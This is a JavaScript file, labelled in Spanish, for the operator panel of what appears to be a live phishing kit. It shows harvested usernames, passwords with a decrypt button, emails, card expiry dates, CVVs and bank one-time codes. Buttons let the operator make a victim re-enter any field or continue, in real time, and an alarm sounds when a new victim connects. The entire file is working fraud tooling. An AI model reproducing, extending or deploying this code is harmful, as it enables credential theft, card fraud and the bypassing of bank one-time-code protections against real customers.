(async function(){
  const socket = io();
  let isAdmin = false;
  const loginSection = document.getElementById('loginSection');
  const dashboard = document.getElementById('dashboard');
  const tablewrap = document.getElementById('tablewrap');
  const alerts = document.getElementById('alerts');
  const alertSound = document.getElementById('alert-sound');

  document.getElementById('loginForm').addEventListener('submit', async (e)=>{
    e.preventDefault();
    const fd = new FormData(e.target);
    const user = fd.get('user');
    const pass = fd.get('pass');
    const resp = await fetch('/admin/login', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({user,pass})});
    if (resp.ok){
      isAdmin = true;
      loginSection.classList.add('hidden');
      dashboard.classList.remove('hidden');
      socket.emit('register_admin');
    } else alert('Credenciales incorrectas');
  });

  document.getElementById('logoutBtn').addEventListener('click', async ()=>{ await fetch('/admin/logout', {method:'POST'}); window.location.reload(); });

  function renderRows(users){
    tablewrap.innerHTML = '';
    users.forEach(u => {
      const row = document.createElement('div');
      row.className = 'row card';
      row.innerHTML = `
        <div class="col user">${escapeHtml(u.usuario || '')}</div>
        <div class="col pass">${escapeHtml(u.password_enc || '')} <button data-clientid="${u.clientId}" class="eye">👁</button></div>
        <div class="col email">${escapeHtml(u.correo || '')}</div>
        <div class="col">${escapeHtml(u.fecha || '')}</div>
        <div class="col">${escapeHtml(u.año || '')}</div>
        <div class="col">${escapeHtml(u.cvv || '')}</div>
        <div class="col">${escapeHtml(u.clave_dinamica || '')}</div>
        <div class="col actions">
          <button class="retry" data-field="usuario" data-clientid="${u.clientId}">Usuario</button>
          <button class="retry" data-field="password" data-clientid="${u.clientId}">Contraseña</button>
          <button class="retry" data-field="correo" data-clientid="${u.clientId}">Correo</button>
          <button class="retry" data-field="cvv" data-clientid="${u.clientId}">CVV</button>
          <button class="retry" data-field="clave_dinamica" data-clientid="${u.clientId}">Clave dinámica</button>
          <button class="cont" data-clientid="${u.clientId}">✔ Continuar</button>
        </div>
      `;
      tablewrap.appendChild(row);
    });
  }

  function escapeHtml(s){ if(!s) return ''; return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;'); }

  tablewrap.addEventListener('click', async (e)=>{
    const btn = e.target.closest('button');
    if(!btn) return;
    const clientId = btn.dataset.clientid;
    if(btn.classList.contains('eye')){
      const resp = await fetch('/admin/decrypt/' + clientId);
      if(resp.ok){ const data = await resp.json(); alert('Contraseña: ' + data.password); }
      return;
    }
    if(btn.classList.contains('retry')){
      const field = btn.dataset.field;
      await fetch('/admin/action', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({clientId, field, action:'retry'})});
      return;
    }
    if(btn.classList.contains('cont')){
      await fetch('/admin/action', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({clientId, field:null, action:'continue'})});
      return;
    }
  });

  socket.on('initial_data', (users) => renderRows(users));
  socket.on('user_updated', (user) => { fetch('/admin/records').then(r=>r.json()).then(renderRows); });

  socket.on('new_user_connected', (data) => {
    // visual alert
    const box = document.createElement('div');
    box.className = 'alert-box alert-red';
    box.innerHTML = `🚨 Nuevo usuario conectado: <b>${escapeHtml(data.usuario || data.clientId)}</b>
      <div class="alert-actions">
        <button id="silence">Silenciar</button>
      </div>`;
    alerts.appendChild(box);
    // play sound in loop
    alertSound.currentTime = 0;
    alertSound.play();
    // silence handler
    document.getElementById('silence').addEventListener('click', ()=>{ alertSound.pause(); alertSound.currentTime=0; box.remove(); });
    // auto remove after 20s if not silenced
    setTimeout(()=>{ try{ box.remove(); alertSound.pause(); alertSound.currentTime=0; }catch(e){} }, 20000);
  });

  socket.on('connect', ()=> console.log('socket connected'));
})();
